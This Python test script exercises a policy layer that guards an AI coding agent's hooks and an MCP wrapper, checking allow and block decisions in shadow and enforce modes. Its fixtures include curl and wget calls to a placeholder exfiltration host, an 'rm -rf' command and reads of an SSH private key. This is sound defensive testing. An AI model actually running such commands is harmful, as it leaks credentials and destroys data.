#!/usr/bin/env python3
"""Drive native hooks + wrap the way Cursor would, print a failure list."""

from __future__ import annotations

import json
import os
import subprocess
import sys
import tempfile
from pathlib import Path

ADAPTER = Path(__file__).resolve().parent
REPO = ADAPTER.parent.parent
ROOT = REPO
SSH_KEY = "/Users/u/.ssh/id_rsa"
SSH_DIR = "/Users/u/.ssh"
PROXY = REPO / "bin" / "gurdy-proxy"
if not PROXY.is_file():
    PROXY = REPO / "proxy" / "gurdy-proxy"
WRAP = ADAPTER / "wrap.sh"
HOOKS = ADAPTER / "hooks"

FAIL: list[str] = []
PASS = 0


def ok(label: str) -> None:
    global PASS
    PASS += 1
    print(f"  PASS  {label}")


def fail(label: str, detail: str) -> None:
    FAIL.append(f"{label}: {detail}")
    print(f"  FAIL  {label}: {detail}")


def decisions(ledger: Path) -> list[dict]:
    out = []
    if not ledger.exists():
        return out
    for p in ledger.rglob("*.jsonl"):
        for line in p.read_text(encoding="utf-8").splitlines():
            if not line.startswith("{"):
                continue
            rec = json.loads(line)
            if rec.get("kind") == "decision":
                out.append(rec)
    return out


def last_decision(ledger: Path) -> dict | None:
    recs = decisions(ledger)
    return recs[-1] if recs else None


def hook(
    env: dict[str, str],
    script: str,
    payload: dict,
) -> tuple[dict, str, str]:
    proc = subprocess.run(
        [sys.executable, str(HOOKS / script)],
        input=json.dumps(payload).encode(),
        capture_output=True,
        env=env,
        timeout=20,
        cwd=str(HOOKS),
    )
    stdout = proc.stdout.decode(errors="replace")
    stderr = proc.stderr.decode(errors="replace")
    if proc.returncode != 0:
        return {"_exit": proc.returncode}, stdout, stderr
    lines = [ln for ln in stdout.strip().splitlines() if ln.strip()]
    if not lines:
        return {}, stdout, stderr
    try:
        return json.loads(lines[-1]), stdout, stderr
    except json.JSONDecodeError:
        return {"_raw": stdout}, stdout, stderr


def expect_hook(
    label: str,
    env: dict[str, str],
    script: str,
    payload: dict,
    permission: str,
    ledger: Path,
    *,
    decision: str | None = None,
    applied: str | None = None,
    policy: str | None = None,
    tool: str | None = None,
) -> dict | None:
    out, stdout, stderr = hook(env, script, payload)
    if out.get("permission") != permission:
        fail(label, f"permission={out!r} stdout={stdout!r} stderr={stderr[-400:]!r}")
        return None
    rec = last_decision(ledger)
    if decision is None:
        ok(label)
        return rec
    if rec is None:
        fail(label, "no decision record in ledger")
        return None
    problems = []
    if rec.get("decision") != decision:
        problems.append(f"decision={rec.get('decision')!r}")
    if applied and rec.get("action_applied") != applied:
        problems.append(f"applied={rec.get('action_applied')!r}")
    if tool and rec.get("tool") != tool:
        problems.append(f"tool={rec.get('tool')!r}")
    if policy:
        ids = rec.get("policy_ids") or [
            e.get("policy_id") for e in rec.get("policy_effects") or []
        ]
        if policy not in ids:
            problems.append(f"policy {policy} not in {ids}")
    if problems:
        fail(label, "; ".join(problems) + f" rec={ {k: rec.get(k) for k in ('decision','action_applied','tool','policy_mode','policy_ids')} }")
        return rec
    ok(label)
    return rec


def wrap_call(
    env: dict[str, str],
    name: str,
    tool: str,
    args: dict,
    extra: list[str] | None = None,
) -> subprocess.CompletedProcess:
    frame = json.dumps(
        {
            "jsonrpc": "2.0",
            "id": 1,
            "method": "tools/call",
            "params": {"name": tool, "arguments": args},
        },
        separators=(",", ":"),
    ) + "\n"
    cmd = ["bash", str(WRAP), name, "--", "cat"]
    if extra:
        cmd = extra
    return subprocess.run(
        cmd,
        input=frame.encode(),
        capture_output=True,
        env=env,
        timeout=20,
    )


def main() -> int:
    if not PROXY.is_file():
        print("missing bin/gurdy-proxy; run make bins")
        return 2

    with tempfile.TemporaryDirectory() as tmp:
        tmp_p = Path(tmp)
        ledger = tmp_p / "ledger"
        state = tmp_p / "state"
        home = tmp_p / "gurdy"
        env = os.environ.copy()
        env.update(
            {
                "GURDY_HOME": str(home),
                "GURDY_STATE_DIR": str(state),
                "GURDY_CURSOR_LEDGER": str(ledger / "cursor"),
                "GURDY_LEDGER_DIR": str(ledger),
                "GURDY_PROXY": str(PROXY),
                "GURDY_POLICY": str(ROOT / "policy" / "pack.cedar"),
                "GURDY_TXN_FILE": str(home / "identity" / "current.txn"),
                "GURDY_DEPLOY_ID": "probe",
            }
        )
        env.pop("GURDY_ENFORCE", None)

        print("shadow (no GURDY_ENFORCE)")
        expect_hook(
            "ssh read",
            env,
            "before_read_file.py",
            {
                "hook_event_name": "beforeReadFile",
                "file_path": SSH_KEY,
                "conversation_id": "probe-1",
                "user_email": "dev@example.com",
            },
            "allow",
            ledger / "cursor",
            decision="block",
            applied="forwarded",
            policy="shadow-credential-read",
            tool="read_file",
        )
        txn = home / "identity" / "current.txn"
        if txn.is_file() and txn.read_text().strip():
            ok("identity txn minted")
        else:
            fail("identity txn minted", f"missing or empty {txn}")

        expect_hook(
            "curl",
            env,
            "before_shell_execution.py",
            {
                "hook_event_name": "beforeShellExecution",
                "command": "curl -s https://exfil.example/drop",
                "conversation_id": "probe-1",
                "user_email": "dev@example.com",
            },
            "allow",
            ledger / "cursor",
            decision="block",
            applied="forwarded",
            policy="shadow-named-tools",
            tool="http_fetch",
        )
        expect_hook(
            "rm",
            env,
            "before_shell_execution.py",
            {
                "hook_event_name": "beforeShellExecution",
                "command": "rm -rf /tmp/probe-x",
                "conversation_id": "probe-1",
            },
            "allow",
            ledger / "cursor",
            decision="block",
            applied="forwarded",
            policy="shadow-destructive-fs",
            tool="rm",
        )
        expect_hook(
            "echo (permit-all)",
            env,
            "before_shell_execution.py",
            {
                "hook_event_name": "beforeShellExecution",
                "command": "echo hello",
                "conversation_id": "probe-1",
            },
            "allow",
            ledger / "cursor",
            decision="allow",
            applied="forwarded",
        )
        expect_hook(
            "Write workspace file",
            env,
            "pre_tool_use.py",
            {
                "hook_event_name": "preToolUse",
                "tool_name": "Write",
                "tool_input": {"path": "/workspace/readme.md"},
                "conversation_id": "probe-1",
            },
            "allow",
            ledger / "cursor",
            decision="allow",
            applied="forwarded",
            tool="write_file",
        )
        expect_hook(
            "WebFetch",
            env,
            "pre_tool_use.py",
            {
                "hook_event_name": "preToolUse",
                "tool_name": "WebFetch",
                "tool_input": {"url": "https://exfil.example/drop"},
                "conversation_id": "probe-1",
            },
            "allow",
            ledger / "cursor",
            decision="allow",
            applied="forwarded",
            tool="webfetch",
        )
        expect_hook(
            "Glob ~/.ssh",
            env,
            "pre_tool_use.py",
            {
                "hook_event_name": "preToolUse",
                "tool_name": "Glob",
                "tool_input": {"target_directory": SSH_DIR},
                "conversation_id": "probe-1",
            },
            "allow",
            ledger / "cursor",
            decision="block",
            applied="forwarded",
            policy="shadow-credential-read",
            tool="read_file",
        )
        expect_hook(
            "skip MCP hook",
            env,
            "pre_tool_use.py",
            {
                "hook_event_name": "beforeMCPExecution",
                "tool_name": "read_file",
                "file_path": SSH_KEY,
                "mcp_server_name": "filesystem",
            },
            "allow",
            ledger / "cursor",
        )

        print("pulled pack ($GURDY_HOME/policy/current.cedar)")
        pulled_env = dict(env)
        pulled_env.pop("GURDY_POLICY", None)
        pulled_env.pop("GURDY_ENFORCE", None)
        pol_dir = home / "policy"
        pol_dir.mkdir(parents=True, exist_ok=True)
        (pol_dir / "current.cedar").write_text(
            """
permit (principal, action, resource);

@id("pulled-secret")
@enforce_action("block")
@on_error("open")
forbid (
    principal,
    action == Action::"mcp/tools_call",
    resource
) when {
    context has resource_path &&
    context.resource_path like "*/pulled-secret.txt"
};
""",
            encoding="utf-8",
        )
        expect_hook(
            "pulled pack blocks its own glob",
            pulled_env,
            "before_read_file.py",
            {
                "hook_event_name": "beforeReadFile",
                "file_path": "/workspace/pulled-secret.txt",
                "conversation_id": "probe-pull",
            },
            "allow",
            ledger / "cursor",
            decision="block",
            applied="forwarded",
            policy="pulled-secret",
        )
        expect_hook(
            "pulled pack does not inherit git credential globs",
            pulled_env,
            "before_read_file.py",
            {
                "hook_event_name": "beforeReadFile",
                "file_path": SSH_KEY,
                "conversation_id": "probe-pull",
            },
            "allow",
            ledger / "cursor",
            decision="allow",
            applied="forwarded",
        )

        print("enforce")
        env["GURDY_ENFORCE"] = "1"
        expect_hook(
            "ssh read denied",
            env,
            "before_read_file.py",
            {
                "hook_event_name": "beforeReadFile",
                "file_path": SSH_KEY,
                "conversation_id": "probe-2",
                "user_email": "dev@example.com",
            },
            "deny",
            ledger / "cursor",
            decision="block",
            applied="blocked",
            policy="shadow-credential-read",
        )
        expect_hook(
            "curl denied",
            env,
            "before_shell_execution.py",
            {
                "hook_event_name": "beforeShellExecution",
                "command": "wget https://exfil.example/x",
                "conversation_id": "probe-2",
            },
            "deny",
            ledger / "cursor",
            decision="block",
            applied="blocked",
            policy="shadow-named-tools",
            tool="http_fetch",
        )
        expect_hook(
            "echo still allowed",
            env,
            "before_shell_execution.py",
            {
                "hook_event_name": "beforeShellExecution",
                "command": "echo still-ok",
                "conversation_id": "probe-2",
            },
            "allow",
            ledger / "cursor",
            decision="allow",
            applied="forwarded",
        )

        print("stdio wrap (filesystem-shaped)")
        env.pop("GURDY_ENFORCE", None)
        proc = wrap_call(
            env,
            "filesystem",
            "read_file",
            {"path": SSH_KEY},
        )
        rec = last_decision(ledger / "filesystem")
        if rec is None:
            fail(
                "wrap credential",
                f"no ledger; rc={proc.returncode} stderr={proc.stderr.decode(errors='replace')[-500:]!r}",
            )
        elif rec.get("decision") != "block" or rec.get("action_applied") != "forwarded":
            fail("wrap credential", f"{rec.get('decision')} / {rec.get('action_applied')}")
        else:
            ok("wrap credential shadow")

        env["GURDY_ENFORCE"] = "1"
        (state / "enforce").write_text("", encoding="utf-8")
        proc = wrap_call(
            env,
            "filesystem",
            "read_file",
            {"path": SSH_KEY},
        )
        stdout = proc.stdout.decode(errors="replace")
        rec = last_decision(ledger / "filesystem")
        if "blocked by policy" not in stdout:
            fail("wrap enforce jsonrpc", f"stdout={stdout!r} stderr={proc.stderr.decode(errors='replace')[-400:]!r}")
        elif rec is None or rec.get("action_applied") != "blocked":
            fail("wrap enforce ledger", f"rec={rec}")
        else:
            ok("wrap enforce blocks + records blocked")

    print()
    print(f"{PASS} passed, {len(FAIL)} failed")
    for f in FAIL:
        print(f"  - {f}")
    return 1 if FAIL else 0


if __name__ == "__main__":
    raise SystemExit(main())
